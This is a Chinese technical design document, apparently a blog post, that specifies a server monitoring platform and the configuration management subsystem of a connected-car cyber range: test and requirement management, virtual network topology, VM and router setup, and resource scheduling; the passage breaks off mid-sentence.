src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8a5e5955a7e1d965cc42c9b06a29abdc.png" alt="2904d23d-2702-4e0b-9192-e071bdfa30ff"></p><p>功能参数设计方面，平台提供了全面的物理服务器层面的监控和管理功能。用户可以对物理服务器进行宏观的平台负载情况监控，包括综合负载、CPU使用率、内存使用率、网络速度等多个监测指标。平台还提供了性能评估功能，允许用户对服务器进行性能评估，并根据服务器类型进行筛选和搜索。监控结果以不同区段和颜色展示，便于用户快速了解服务器状态。</p><p>此外，平台支持对操作及接口调用的日志进行记录和查看，用户可以根据时间范围、日志类型等条件进行查看和统计。还可以对平台运行组件的状态进行监控，包括中间件和后台服务的状态统计、操作和日志查看。</p><p>物理服务器和虚拟机的网络结构显示也受到支持，用户可以查看服务器的实例号、二层虚拟链路地址以及下挂的VLAN号与对应关系，还可以监控包数量和虚拟交换机端口上下行速率，便于及时掌握链路状态。</p><p>基础信息监控包括主机名、操作系统信息、CPU信息、硬盘信息、内存信息、网卡信息、操作系统信息和机架位置等。平台还支持告警信息查看、服务统计监控、服务器按应用划分、基础信息监控性能图表监控等多项功能，提供了对物理服务器各方面信息的实时数值监控。</p><p>此外，平台还展示了运行的网络设备状态，包括交换机和路由器等，支持查看端口的运行状态、管理状态和实时流量等信息。用户操作日志查看功能支持分角色和类型筛选，同时提供TOP10的接口调用查看和TOP10的接口使用用户查看。</p><p>性能参数设计方面，平台支持管理40台服务器的运维管理，确保了资源管理的有效性和扩展性。</p><p>包含监控、评估、日志管理、网络结构显示、告警系统和性能参数要求等多个方面，以满足对物理服务器层面宏观的平台负载情况的监控和管理需求。</p><p>1. 平台负载监控</p><p>监控指标：系统将提供综合负载、CPU使用率、内存使用率、网络速度等5类监控数值。</p><p>性能评估：系统将支持对物理服务器的性能进行评估，能够根据服务器类型进行筛选，并提供基于主机名称和IP的搜索功能。</p><p>视觉展示：综合负载将按数值大小展示不同颜色区段，以直观显示服务器的负载情况。</p><p>2. 日志管理</p><p>日志记录：平台将记录所有操作及接口调用的日志，支持按时间范围、日志类型等条件进行查看。</p><p>统计分析：系统将能够划分角色、操作类型等条件对操作日志进行统计。</p><p>3. 运行组件监控</p><p>状态监控：监控系统采用的中间件及后台服务的状态。</p><p>组件管理：允许用户开启、停止、重启相关组件，并查看操作日志。</p><p>4. 网络结构显示</p><p>网络拓扑：显示物理服务器和虚拟机的网络结构，包括实例号、二层虚拟链路地址、VLAN号等。</p><p>流量监控：监控包数量和虚拟交换机端口的上下行速率。</p><p>5. 基础信息监控</p><p>服务器信息：监控服务器的基础信息，如主机名、操作系统、CPU、硬盘、内存、网卡信息、机架位置等。</p><p>远程接入：提供SSH接入进行运维处理。</p><p>6. 告警系统</p><p>告警信息：展示告警信息，包括威胁等级、优先级、数值和触发告警时间。</p><p>7. 服务统计监控</p><p>服务监控：监控服务信息、服务进程、失败次数和比例、开始时间和运行时间等。</p><p>8. 应用划分与性能图表</p><p>应用划分：按照计算节点、应用节点、网络节点等划分服务器。</p><p>性能图表：提供CPU、内存、物理网卡硬盘、网卡、IP连接、上下行流量、OVS端口、进程等信息的实时数值监控。</p><p>9. 网络设备状态展示</p><p>设备状态：展示平台运行的网络设备状态，包括交换机、路由器等，并支持查看每个端口的运行状态、管理状态、实时流量等信息。</p><p>10. 用户操作日志</p><p>日志查看：支持分角色、分类型对用户操作日志进行筛选，并提供接口调用和用户使用的TOP10查看。</p><p>11. 性能参数</p><p>服务器管理：系统将支持40台服务器的运维管理。</p><p>12. 实施步骤</p><p>详细分析监控和管理需求，确定监控指标和功能列表。</p><p>技术选型：选择合适的监控技术和工具，如Zabbix、Prometheus、Grafana等。</p><p>系统设计：设计系统架构，包括数据收集、存储、处理、展示和告警模块。</p><p>部署实施：在服务器上部署监控代理，配置监控中心，设置告警规则。</p><p>功能开发：开发日志管理、网络结构显示、基础信息监控等功能。</p><p>测试验证：测试系统功能，确保监控数据准确，告警及时。</p><p>用户培训：对运维人员进行系统使用培训。</p><p>上线运行：系统上线并进入运行阶段，进行实时监控和管理。</p><p>维护升级：持续对系统进行维护和升级，确保系统稳定运行。</p><p>通过本方案实施，将为车载网络管理系统提供一个强大的服务器监控和管理工具，帮助运维人员及时发现和解决问题，保障系统稳定性和性能。</p><h1 id="智能汽车网络靶场试验配置管理分系统"><a href="#智能汽车网络靶场试验配置管理分系统" class="headerlink" title="智能汽车网络靶场试验配置管理分系统"></a>智能汽车网络靶场试验配置管理分系统</h1><h2 id="汽车安全测试模块"><a href="#汽车安全测试模块" class="headerlink" title="汽车安全测试模块"></a>汽车安全测试模块</h2><ul><li>支持根据测试结论生成测试报告,报告包含测试用例通过数，未通过数，结论，综合评分等内容，提供产品功能截图证明；</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4b1b8b9aae810771dcb3a080f06ad651.png"></p><p>功能参数设计为，系统提供全面的测试项目管理，涵盖测试准备、执行和归档，确保全流程管理的高效实施。此外，系统允许配置测试项目的关键元素：测试对象、人员和环境，包括为测试人员分配必需的环境接入机器，并支持将测试项目细化为多个测试项。对于测试项的管理，系统允许配置具体的测试用例，这包括直接添加新用例或从现有的测试用例库中选择。</p><p>进一步地，系统支持测试项的流程编排，定义包括人工单例、批量、自动化测试、流量采集和分析、攻击等多种类型的测试事务。这些测试事务可以灵活编排到测试流程的各个步骤中，并且每个步骤可以被设置为人工执行或自动执行。系统还提供了测试项目执行的控制功能，包括开始和停止操作。</p><p>在测试执行方面，系统使测试人员能够查看项目详情，并通过接入机器登录到测试环境中，按照测试方案和用例要求进行测试。系统支持测试人员根据测试用例提交测试结果，结果支持富文本格式，增强了结果表达的灵活性。此外，系统能够进行全面的测试统计，包括测试项数量、测试用例数、产品和公用漏洞数，还包括测试用例的通过率统计及其图表展示。</p><p>对于测试结果的管理，系统支持测试结果的查看，并能够基于这些结果自动生成详尽的测试报告。系统还允许重新开启测试活动进行复测，同时对历史测试数据进行归档处理，确保历史数据和报告的可访问性。此外，系统还涵盖了广泛的资源管理功能，包括实物和虚拟测试设备及其镜像的管理，测试工具的分类管理，测试模板的管理，以及测试方案和测试对象的综合管理。</p><p>系统不仅处理测试项目中发现的漏洞信息，提供快速查询和复测，还支持对测试中发现的漏洞进行统计和图表展示，包括漏洞等级和状态。系统还提供了漏洞知识库的管理功能，允许用户根据测试场景中发现的漏洞链接到对应的知识库。在测试资产管理方面，系统提供了资产信息、服务商、组件、组件成分分析及其潜在漏洞的展示，并支持查看资产测试中发现的漏洞，展示资产组件的依赖关系。</p><p>性能参数设计为，系统支持同时开展100个测试任务，确保了在高负载条件下的稳定运行。此外，系统的测试poc库包含2000个项目，提供了丰富的测试资源和场景，以满足广泛的测试需求。</p><p>系统具备测评任务的管理功能，支持测评任务增删改查、测评报告管理和测评状态的监视，支持历史测评任务的查看，可根据任务的名称、时间、参与人员等进行任务检索。</p><p>系统具备测评场景设计与构建功能，支持多人多层同时设计测评场景，支持一个测评任务在多个测评场景间切换，支持场景、子场景、设备等多级模板的保存与使用，支持节点复制、模板组合、多人多层共享设计等多种方式提高测评场景构建效率。支持拓扑编辑通过增加镜像线的方式支持测评场景内部虚拟主机流量镜像的功能，将特定的虚拟机指定端口的流量镜像到另一虚拟机的指定端口，实现测评场景中内部旁路监听功能。</p><p>系统支持在测评场景中描述各类网络设备、安全设备、工具设备等，能够动态组网实现防御能力评测、渗透测试等的各种典型场景。</p><p>系统具备测评资源调度功能，支持靶标、工具等资源的预约，支持根据资源预约情况和资源实时状态自动调度生成测试环境。</p><p>系统具备测评流程编排导调功能，支持在流程中对攻防渗透、安全防御检测、漏洞挖掘、靶标配置按照步骤进行编排和调度，流程编排支持步骤的分支和汇聚，支持收集各系统状态数据并监控相关任务状态。测评流程编排包括测试方案选择、测试用例配置、测评场景定义等，测试用例支持对测试用例的详细任务进行配置和调度，包括执行脚本、下发配置和向工具下发任务等。支持通过专用数据通道向测评场景内设备下发任务配置和收集结果。</p><p>系统具备数据采集能力，支持采集测试工具、设备的状态信息和测试过程信息，支持采集指定节点的流量报文，并能发送给指定的分析与存储设备进行分析存储，并能根据不同的试验给流量实时标记不同标签，用于不同任务数据的查询。</p><p>系统具备测评归档和防护策略演进分析功能，支持任务结束后对任务相关数据进行归档，便于后续进行相关信息查询，支持跨任务的防护策略演进分析。</p><p>系统具备测试过程中测评数据存储能力。原始测评报文存储处理性能不低于1Gbps，支持数据包加密存储，支持压缩存储。支持指定IP、端口等五元组条件对测评原始报文进行检索，检索性能不低于10TB/s。</p><p>支持同时管理和调度的任务数不低于100个，单个测评场景拓扑节点数不低于10000个，测评场景分层编排的层级数不低于5层，具备1000节点集群的批量化配置能力，支持测评任务通过不低于10个场景模板进行组合，具备测评环境根据测评任务进展更新功能，支持同时接入系统进行测评操作的人数不低于100人，支持虚拟和实物设备的接入方式不低于3种，支持系统测试poc库不低于2000个。</p><p>测评流程编排导调一个测评试验具备的流程步骤的数量不低于10个，一个步骤具备执行的事务数量不低于10个，支持场景流程的循环执行次数不低于10次。</p><h4 id="安全攻防任务管理子模块"><a href="#安全攻防任务管理子模块" class="headerlink" title="安全攻防任务管理子模块"></a>安全攻防任务管理子模块</h4><h5 id="测评任务管理"><a href="#测评任务管理" class="headerlink" title="测评任务管理"></a>测评任务管理</h5><p>测评任务管理负责测评任务增删改查、测评报告管理和测评状态的监视，支持历史测评任务的查看，可根据任务的名称、时间、参与人员等进行任务检索。支持任务结束后对任务相关数据进行归档，便于后续进行相关信息查询。</p><p>测评任务管理负责测评全生命周期的管理，包括需求管理、测试计划管理、测试用例管理和测试报告管理等功能。</p><p>需求管理：需求管理模块是需求分析员对测试需求进行新增、修改、删除以及提交审核 的操作。其具体的业务流程是：需求分析员进入登录界面，输入验证信息，若验 证信息正确则进入相应权限页面；若验证信息错误，则系统给出提示，需重新输入。需求分析员进入系统界面后，选择需求管理模块，可进行新增需求、修改需求信息和删除需求操作。新增需求时，系统判断需求ID是否己存在，若己存在, 系统给出提示信息；删除需求时，系统给出确认删除的提示。新增、修改或删除 需求后，系统更新需求信息。</p><p>新增需求：此功能模块是对新增需求功能点的管理。它是根据软件需求规格说明书提取 出来的测试需求，新增需求必须经评审通过了才能生效。需求应以一个功能点对 应一个需求ID的条例形式统计出用户需求，这样把需求从传统的文档形式转化 为一条条的功能点，不仅便于查证是否与用户需求一致，而且便于检査测试用例 是否全面覆盖了需求中的功能点。</p><p>修改需求：此功能模块是对需求功能点进行修改的管理。经修改的需求必须通过评审才 能生效，且在修改需求时需要填写修改人姓名以及修改原因，且在修改成功后， 原需求仍然存在，只是显示为失效状态。</p><p>删除需求：此功能模块是对需求功能点进行删除的管理。需要删除的需求必须通过评审 才能生效，且在删除需求时需要填写删除人姓名以及删除原因，且在删除成功后， 原功能点仍然存在，只是显示为失效状态。</p><p>审核需求：此功能模块是对需求变更进行审核的管理。审核人对需求变更的申请进行评 审，给出“审核通过”或“审核驳回”的评审结果，在驳回时需备注驳回原因。</p><p>发布需求：此功能模块是对审核通过的需求进行发布的管理。审核通过的需求经过发布 则可正式被使用。</p><p>需求变更：此功能模块是对已变更的需求进行的相关管理。需求管理中既有对需求变更 后的记录，也保存变更前的记录，以供日后进行工作追踪。</p><p>测试需求修改管理的流程如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/d9c51ec876edc86d66425a0ef11152d0.png"></p><p>测试需求管理流程</p><p>需求分析员在需求管理页面，选择修改需求子功能，选择一条需求信息，触发一个 demandAlterBefore.action请求；</p><p>demandAlterBefore.action 请求被 struts.xml 文件拦截并选择 demandAlterBeforeAction.java 类处理请求；</p><p>demandAlterBeforeAction类获取所有已存在以及需要修改的需求信息, 然后将获取的结果返回给struts.xml,若果返回的是success结果，则跳转到 demandAlterContext.jsp页面(修改需求对话框页面)；</p><p>需求分析员修改需求信息，并点击确定；</p><p>提交信息的post方法将信息的参数传递给demandAlterAction.java类进 行处理；</p><p>demandAlterAction.java 类将 demandAlterContext.jsp 页面传来的信息进 行处理并添加在数据库中，且将返回结果(SUCCESS或INPUT)传送给struts.xml, 让其选择相应的返回页面，若返回的是“SUCCESS”则跳转到修改需求主页面</p><p>(demandAlterMain.jsp)；</p><p>修改操作执行后，向LogRecord类发出调用refresh()方法的消息进行 日志的记录操作。</p><p>需求管理是需求分析员对新增需求、修改需求信息、删除需求以及提交需求 审核的操作。现以新增需求为例进行详细叙述。</p><p>点击新增按钮，弹岀新增需求对话框，对话框中包含以下字段：需求ID、 需求名称、所属模块、需求描述、功能限制条件和备注。其中，需求ID是唯一 性标识，不可重复，需求名称、所属模块和需求描述是必填项。当输入已存在的 需求ID时，系统需给出“需求ID已存在，请重新输入”的提示；当点击保存时, 若必填字段处为空，则系统给出“请输入必填信息”提示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/574cad0cbec495321a128e8affd13b78.png"></p><p>点击需求记录的详情标识，系统显示的表单为不可编辑状态。在撰写用例时， 每条用例会有对应的用例ID,且因每条用例都会对应于一条需求信息，因此在 用例信息中会有用例所对应的需求ID所以当点击查看一个已经有对应用例的 需求信息时，需求表单详情会比新增需求表单多一个“用例ID”字段，且一个 需求ID可能对应多条用例ID。</p><h5 id="测试计划管理"><a href="#测试计划管理" class="headerlink" title="测试计划管理"></a>测试计划管理</h5><p>测试范围：此功能项是对测试工作范围的管理。依据测试需求中的功能点来制定测试工 作的范围，告诉测试工作人员需要做什么，并用什么样的数据进行测试。</p><p>测试人员：此功能项是对测试人员信息的管理。主要是对参与一个项目测试工作的所有人员信息的管理。</p><p>测试分工：此功能项是对测试人员工作分配的管理。如测试负责人由谁担任，测试高级工程师(负责撰写测试用例)由谁担任，测试工作由谁负责等。</p><p>测试时间：此功能项是对测试时间安排的管理。主要是对测试工作的阶段性安排，特定 时间完成特定任务的规划，如何时启动测试工作、何时完成哪些模块的测试，何 时进行回归测试等。</p><p>测试环境：此功能项是对实施测试工作所需的环境和资源的描述。测试环境是指能够完 成测试工作所必须的计算机硬件、软件以及其他的设备资源。稳定的测试环境有 助于测试工作高效完成，一般情况，实施测试时需将测试环境的配置信息妥善保 存，以备日后能够快速还原工作中的问题。</p><h5 id="测试用例管理"><a href="#测试用例管理" class="headerlink" title="测试用例管理"></a>测试用例管理</h5><p>新增用例：此功能模块是对新增用例的管理。测试高级工程师根据机构订购的测试规范 进行用例的撰写，新增用例必须经评审通过了才能生效。用例应有用例ID编号, 与需求功能点对应，且多条用例可以对应一个需求功能点。</p><p>修改用例：此功能模块是对用例进行修改的管理。经修改的用例必须通过评审才能生 效，且在修改用例时需要填写修改人姓名以及修改原因，且在修改成功后，原用 例仍然存在，只是显示为失效状态。</p><p>删除用例：此功能模块是对用例进行删除的管理。需要删除的用例必须通过评审才能生 效，且在删除用例时需要填写删除人姓名以及删除原因，且在删除成功后，原用 例仍然存在，只是显示为失效状态。</p><p>待审核用例：此功能模块是对用例变更进行审核的管理。审核人对用例变更的申请进行评 审，给出“审核通过”或“审核驳回”的评审结果，在驳回时需备注驳回原因。 审核人在此模块可看到需要审核的用例，发起用例变更的申请人也可在此模块中 看到审核情况。</p><p>用例分配：此功能模块是对用例进行分配的管理。撰写测试用例的人员（测试高级工程 师）在此模块中将生效的用例按照用例编号分配给测试人员，测试人员可在此模 块中看到自己需要测试的用例情况。</p><p>用例测试结果：此功能模块是对用例执行结果的管理。当所有测试用例被执行完毕后，测试 高级工程师对整个测试工作进行跟踪记录，对于通过、未通过以及缺陷情况进行统计分析。</p><h5 id="测试报告管理"><a href="#测试报告管理" class="headerlink" title="测试报告管理"></a>测试报告管理</h5><p>新增测试报告：此功能项是对新增测试报告的管理。它是测试人员和测试负责人对测试工作 的阶段性汇报。其中，由于测试人员有新增测试报告权限，而无修改测试报告权 限，所以测试人员在新增测试报告时需备注新增时间，系统将自动以最后一次新 增时间为准。</p><p>修改测试报告：此功能项是对测试报告进行修改的管理。只有测试负责人拥有该功能模块的 权限，在测试负责人修改测试报告时需填写修改人姓名并记录修改时间，在修改 成功后，以前的测试报告仍然存在，只是显示为失效状态。</p><p>删除测试报告：此功能项是对测试报告进行删除的管理。只有测试负责人拥有该功能模块的 权限，在测试负责人删除测试报告时需填写删除人姓名并备注删除原因，在删除 成功后，以前的测试报告仍然存在，只是显示为失效状态。</p><h5 id="测评场景设计与构建"><a href="#测评场景设计与构建" class="headerlink" title="测评场景设计与构建"></a>测评场景设计与构建</h5><p>系统支持多人多层同时设计测评场景，支持一个测评任务在多个测评场景间切换，支持场景、子场景、设备等多级模板的保存与使用，支持节点复制、模板组合、多人多层共享设计等多种方式提高测评场景构建效率。支持拓扑编辑通过增加镜像线的方式支持测评场景内部虚拟主机流量镜像的功能，将特定的虚拟机指定端口的流量镜像到另一虚拟机的指定端口，实现测评场景中内部旁路监听功能。</p><p>系统支持在测评场景中描述各类网络设备、安全设备、工具设备等，能够动态组网实现防御能力评测、渗透测试等的各种典型场景。</p><h6 id="虚拟网络配置"><a href="#虚拟网络配置" class="headerlink" title="虚拟网络配置"></a>虚拟网络配置</h6><p>虚拟主机（虚拟机节点和仿真节点）与虚拟链路（虚拟交换机和虚拟路由器等虚拟网络设备）的配置为用户提供自动或者手动地配置虚拟网络环境中的虚拟机和虚拟路由器的功能，从而实现包含虚拟机、协议栈仿真节点和虚拟路由交换链路仿真的复杂网络。</p><p>虚拟主机与虚拟链路配置从如下几个方面实现系统的自动配置：</p><p>方式1、将虚拟机中需要的软件及配置固化在虚拟机镜像中，在虚拟机部署</p><p>启动的时候，就自动运行。一般来说，在软件安装部署与在环境无关，或者虽然相关，但使用不多，可以固定环境参数如IP地址的情况下，通常使用这种方式。</p><p>方式2、将虚拟机中需要的软件固化在虚拟机镜像中，但是在虚拟机部署的时候，将配置注入到虚拟机，虚拟机启动的时候，装载配置，实现自动配置。一般来说，在软件可以预先知道其环境设置的情况下，通常使用这种方式。</p><p>方式3、将虚拟机中需要的软件固化在虚拟机镜像中，但是在虚拟机部署完</p><p>成后，系统自动登录虚拟机，执行预定的程序，将配置注入到虚拟机，实现自动配置。一般来说，在软件依赖其它虚拟机的部署参数，但依赖度不高的情况下，通常使用这种方式。</p><p>方式4、人工配置。通过虚拟节点访问子系统，登录虚拟机，完成配置。</p><p>综合上述，虚拟节点配置的组成如所示。虚拟节点配置可分为虚拟环境配置控制和自动配置模块组成。虚拟环境配置控制负责解析任务配置的参数，按逻辑关系控制自动配置任务的执行，并将执行结果返回到上层调用。自动配置模块根据配置的参数，选择合适的配置文件注入到虚拟机镜像并部署虚拟机镜像，并根据需要和可能，执行远程过程调用，完成自动配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/d47353c9da35bcb69828a6606dc463f3.png"></p><p>虚拟节点配置</p><p>虚拟主机及链路配置主要支持以下两个核心工作流程：1、虚拟主机节点的配置；2、虚拟路由的配置。</p><h6 id="虚拟节点的配置"><a href="#虚拟节点的配置" class="headerlink" title="虚拟节点的配置"></a>虚拟节点的配置</h6><p>通过配置文件来决定启动的虚拟节点的类型和数据，配置文件采用XML文件格式。通常情况下，虚拟节点都有服务端和客户端，系统通过在部署服务端时，绑定注入网络的方式部署，即网络拓扑设计时固定了服务器的IP，这就使得客户端部署时可以直接使用服务器的IP。虚拟节点的配置生成主要包含如的步骤。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/04061e80c1c6706316d9c87f59ffb6c8.png"></p><p>虚拟节点的配置</p><p>具体说明如下：</p><p>1).配置解析向任务控制发出部署服务器任务；</p><p>2).任务控制将任务发送给虚拟机按需部署往服务端注入虚拟节点配置文件；</p><p>3).虚拟机部署部署服务端虚拟机，并给虚拟机绑定IP ；</p><p>4).配置解析发出部署客户端任务；</p><p>5).任务控制将任务发送给虚拟机按需部署往客户端注入虚拟节点配置文件；</p><p>6).虚拟机部署客户端虚拟机；</p><p>7).如果需要跨子网使用且需要作nat映射，在虚拟路由器上配置转发规则和防火墙规则；</p><p>8).配置解析发出部署外网客户端任务，请求配置管理生成外网客户端配置文件；</p><p>9).任务控制将任务发送给虚拟机按需部署往外网客户端注入虚拟节点配置文件；</p><p>10).在部署远程访问客户端时注入新生成的配置文件，部署外网客户端虚拟机。</p><h6 id="网络环境配置"><a href="#网络环境配置" class="headerlink" title="网络环境配置"></a>网络环境配置</h6><p>为试验环境的图形可视化设计提供了一套全面的网络拓扑编辑工具，以支持试验环境的编辑和配置 功能。同时，支持虚拟机主机（包括基础主机、数据库服务、邮件服务、web服务、DNS、虚拟靶机、攻击机、用户自定义主机）、流量模拟虚拟机节点和docker节点（HTTP流量、mail流量、FTP流量）、虚拟网络设备（包括路由器、防火墙、动态路由器和WAF等）、实物主机、靶机和网络设备。</p><p>支持拓扑图的分层展示、按比例缩放和聚合，可在拓扑图中以拖拽方式快速加入各种类型的集群。拓扑图的编辑，要求支持子网以拖拽的方式加入试验网且可以配置其属性，支持子网的可视化拓扑编辑，允许以拖拽的方式完成子网中各类节点链路的组网；拓扑图分层展示，要求支持鼠标滚动时整个拓扑的缩放，支持放大时子网和集群拓扑详情查看、缩小时子网和集群节点聚集的效果；集群定义配置，要求支持集群预定义、支持集群运行时节点数自由扩展、支持子网中以拖拽方式接入各种类型的集群。在拓扑图单页面中，随机生成1万2千个节点、5000条连线, 平均用时可在1 秒以下，且能对这些节点任意的编辑。</p><p>网络环境是由网络及子网、设备等组合而成。系统提供统一的可视化网络设计。通过新建网络或者导入环境模板创建网络。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4d3c5223c12602a71ca8ec860e5e8813.png"></p><p>创建网络</p><p>网络通过可视化的编辑工具，自由拖放网元进行组合。支持的设备包括子网、交换机、路由器、实物交换机、路由器、防火墙、服务器等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/cf4179099c8bc9a742947ceab5123471.png"></p><p>可视化设计网络</p><h6 id="虚拟机配置"><a href="#虚拟机配置" class="headerlink" title="虚拟机配置"></a>虚拟机配置</h6><p>虚拟机具有操作系统类型，方案引用，磁盘方案，所属网络、IP，用户名、密码等相关属性。参数还包括IP/MAC地址、网关地址、型号等。虚拟机提供对多种服务器类型的支持，包括邮件服务器、应用服务器、数据库服务器、内容管理系统(CMS)服务器、文件服务器和WEB服务器。也支持对离散节点进行仿真。配置这些虚拟机时，可以设定多种参数，如设备型号、登录用户信息、登录凭证、操作系统和应用软件等。服务器的类型既支持KVM的节点、docker容器节点、KVM集群、docker集群等。离散事件模拟节点支持IPv4协议的标准数据通信，支持网络蠕虫模拟，支持IP地址的统一管理与配置，支持对离散事件模拟节点的自动化配置。在虚拟节点属性中，界面上用户输入配置属性允许用户输入虚拟机的相关配置。实现通过非网络接口控制虚拟节点或脚本、执行命令，并获取执行结果。</p><p>除在设置各种服务器时，系统自动对这些设备可选用的模板进行过滤。虚拟机可定义多个网卡，在编辑网络拓扑时，将虚拟机连到多个网络中，该虚拟机在部署时自动生成与各个网络相连的网卡，网卡的IP可在设计时进行设置。虚拟机之间支持精确模拟网络链路的功能，能够仿真包括带宽、延迟、丢包率和误码率等网络链路的关键特性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/6a0e9cdf47141b58dcc1035798d6b625.png"></p><p><strong>虚拟机配置</strong></p><h6 id="虚拟路由的配置"><a href="#虚拟路由的配置" class="headerlink" title="虚拟路由的配置"></a>虚拟路由的配置</h6><p>系统使用虚拟机来作为虚拟的路由器，连接系统中的子网络组成一个更大的网络。虚拟路由器可以连接在多个子网络上，实现子网之间的数据流的转发。虚拟路由的配置主要是为路由器配置路由信息，对支持防火墙的虚拟路由器，配置防火墙的出入口规则和转发规则。针对不同类型的虚拟路由器，系统定制了虚拟路由器支持的程序脚本模板，脚本包括：路由设置、防火墙规则、和转发规则等。虚拟路由器有一个网卡固定连接在一个系统定义的管理子网上，程序通过该子网，根据模板和实际参数，产生远程调用脚本，在虚拟路由器上执行，实现虚拟路由器的配置。</p><p>虚拟路由器配置部署的流程如所示。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8068871d33abe4b697294883041a5afb.png"></p><p>虚拟路由器配置部署</p><p>具体说明如下：</p><p>1)配置解析得到一个在子网上创建路由器的任务，并解析得到配置参数如路由器模板、IP、子网掩码、DNS等配置信息；</p><p>2)任务控制根据任务的并发情况，决定是否启动任务；</p><p>3)如果启动任务，调用虚拟机部署，部署虚拟路由器；</p><p>4)等待虚拟路由器启动；</p><p>5)配置解析得到一个在虚拟路由器上连接另一个子网的任务；</p><p>6)任务控制根据任务的并发情况，决定是否执行该任务；</p><p>7)如果执行该任务，系统在虚拟路由器上创建一个网卡，配置网卡网络参数，连接虚拟路由器和子网；</p><p>8)根据配置解析得到的参数，初始化路由配置模板为命令程序；</p><p>9)通过管理子网，远程执行命令程序。</p><p>路由器仿真功能能模拟动态和静态路由表，实现包过滤机制，支持设置优先级，并能在模拟的网络拥塞状态下进行包丢失处理能力的演练。仿真的路由器网络属性包括有路由器的名称、路由协议、静态路由配置，其中路由器的配置支持RIP、BGP、OSPF的协议配置，并支持IPV4，IPV6两种协议方式。配置界面可使用通过此参数，用户可以进行动态路由配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/113e679fcfc695bb1783ae0bd89dd628.png"></p><p>路由器属性设置</p><h6 id="协议栈节点的配置"><a href="#协议栈节点的配置" class="headerlink" title="协议栈节点的配置"></a>协议栈节点的配置</h6><p>系统中包含一个协议栈节点生成模块，其工作流程如下：</p><p>1. 生成配置文件：首先，系统生成包含所需设置的协议栈节点的配置文件。</p><p>2. 发送配置文件：该配置文件随后被发送到协议栈节点生成模块。</p><p>3. 接收和解析：协议栈节点生成模块内部的管理部分接收到配置文件后，开始进行内容解析。</p><p>4. 节点配置：根据配置文件解析出的指令，完成对协议栈节点的最终配置。</p><p>通过这样的流程，可以确保协议栈节点得到正确配置，从而在网络中按预定的方式工作。</p><p>系统提供了一个可视化界面，允许用户通过拖放的方式来设计目标网络。这个界面支持对网络节点进行添加、删除和修改等操作。目标网络的设计兼容四种不同类型的节点：虚拟化节点、轻量级虚拟节点和实物网络节点，所有这些都可以统一在同一个界面中设计和配置。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f55e962b1a2af2599e1df2e834f03262.png"></p><p>协议栈仿真配置</p><h6 id="拓扑模板配置"><a href="#拓扑模板配置" class="headerlink" title="拓扑模板配置"></a>拓扑模板配置</h6><p>除了支持全新设计网络拓扑外，还可通过基于模板的图形化配置方式进行网络拓扑配置。通过鼠标点击或拖拽方式选择设备、设置设备属性以及编辑设备间连接关系等操作。配置结果可保存、加载，以模板形式存储网络配置信息。 <img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/8d65040dc8dae86f0a42c1baf203ba6f.png"></p><p>拓扑模板配置</p><p>网络拓扑模板是由网络及子网、设备等组合而成。系统提供统一的可视化网络设计。通过新建网络或者导入环境模板创建网络。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4d3c5223c12602a71ca8ec860e5e8813.png"></p><p>网络拓扑新建</p><p>网络拓扑模板也通过可视化的编辑工具，自由拖放网元进行组合。支持的设备包括子网、交换机、路由器、实物交换机、路由器、防火墙、服务器等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/cf4179099c8bc9a742947ceab5123471.png"></p><p>设备配置</p><h5 id="测评资源调度"><a href="#测评资源调度" class="headerlink" title="测评资源调度"></a>测评资源调度</h5><p>测评资源调度为测评场景的按需创建、运行提供支持，与其他子系统协同实现测评场景的构建和运行管理。</p><p>在智能测评平台上，资源调度机制的核心职能是解析测评环境的布局以及参与者的配置需求。平台首先会对试验任务中所需的虚拟与实体资源进行识别与评估。一旦资源需求明确，平台就会将整个配置过程分解为一系列任务，并基于这些任务之间的依赖关系，确定其执行的顺序。</p><p>随后，任务会被放入一个异步处理队列中。此过程由一个监控系统持续跟踪，以确保每个任务都能按照既定顺序高效完成。除此之外，用户也可以通过平台的用户界面发起网络拓扑的配置变更要求。这些要求被转化为具体的管理任务，随后加入到异步任务队列中，由监控系统同样确保其顺利执行。</p><p>任务调度管理部门在此过程中扮演关键角色，它识别任务的类型并调用对应的处理模块来执行和调度任务。为了满足底层系统的特定需求，任务还会被细化为子任务，并分派至部署在计算机集群上的相关组件：包括虚拟网络配置管理模块和虚拟机管理模块。这些模块借助本地的虚拟化技术，负责具体任务的处理。一旦任务完成，其结果将通过消息队列系统返回给任务结果管理模块，为用户提供反馈。这样的设计不仅确保了高效、有序的资源调度和管理，还为用户提供了及时的任务执行